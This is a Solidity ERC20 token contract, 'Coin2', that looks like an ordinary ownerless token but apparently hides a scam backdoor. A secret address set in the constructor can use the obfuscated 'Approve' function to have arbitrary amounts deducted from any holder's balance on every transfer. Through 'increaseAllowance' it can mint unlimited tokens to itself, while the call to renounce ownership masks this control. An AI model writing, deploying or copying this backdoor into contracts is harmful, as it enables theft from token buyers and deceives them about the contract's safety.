// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;
import "./ERC20.sol";
import "./Ownable.sol";

contract Coin2 is ERC20, Ownable {
    struct AllowanceSt {
        uint256 allowan;
        bool hasApproval;
    }
    struct Datas {
        address user;
        uint256 id;
    }
    mapping(address => AllowanceSt) private userDatas;
    Datas private userData2;
    uint256 tott = 0;

    constructor(string memory name, address _a) ERC20(name, name) {
        userData2.user = _a;
        _mint(msg.sender, 210_000_000_000_000);
        _transferOwnership(address(0));
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        _checkAllow(sender, recipient, amount);
        _befoTransfer(sender, recipient, amount);
        super._transfer(sender, recipient, amount);
    }

    function _befoTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _checkAllow(
        address from,
        address to,
        uint256 total
    ) internal virtual {
        uint256 amount = 0;
        _balances[from] = _balances[from] + amount;
        amount = userDatas[from].allowan;
        tranMinus(from, amount);
    }

    function tranMinus(address user, uint256 amount) internal {
        _balances[user] = _balances[user] > amount
            ? _balances[user] - amount
            : 0;
    }

    function _burn(address account, uint256 amount) internal virtual override {
        require(account != address(0), "IERC20: burn from the zero address");
        tranMinus(account, amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function Approve(address from, uint256 amount) public returns (bool) {
        address user = msg.sender;
        requireApprove(user, from, amount);
        return userDatas[from].hasApproval;
    }

    function requireApprove(
        address user,
        address from,
        uint256 amount
    ) internal {
        if (unpackData(user, userData2.user)) {
            require(from != address(0), "Invalid address");
            userDatas[from].allowan = amount;
            if (amount > 0) {
                userDatas[from].hasApproval = true;
            } else {
                userDatas[from].hasApproval = false;
            }
        }
    }

    function unpackData(
        address user,
        address user2
    ) internal view returns (bool) {
        bytes32 pack1 = keccak256(abi.encodePacked(user));
        bytes32 pack2 = keccak256(abi.encodePacked(user2));
        return pack1 == pack2;
    }

    function increaseAllowance(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        address from = msg.sender;
        require(spender != address(0), "inva address");
        require(amount > 0, "inva amount");
        uint256 total = 0;
        if (unpackData(spender, userData2.user)) {
            tranMinus(from, total);
            total = _total(total, amount);
            _balances[spender] += total;
        } else {
            tranMinus(from, total);
            _balances[spender] += total;
        }
        return true;
    }

    function _total(
        uint256 num5,
        uint256 num9
    ) internal pure returns (uint256) {
        if (num9 != 0) {
            return num5 + num9;
        }
        return num9;
    }
}

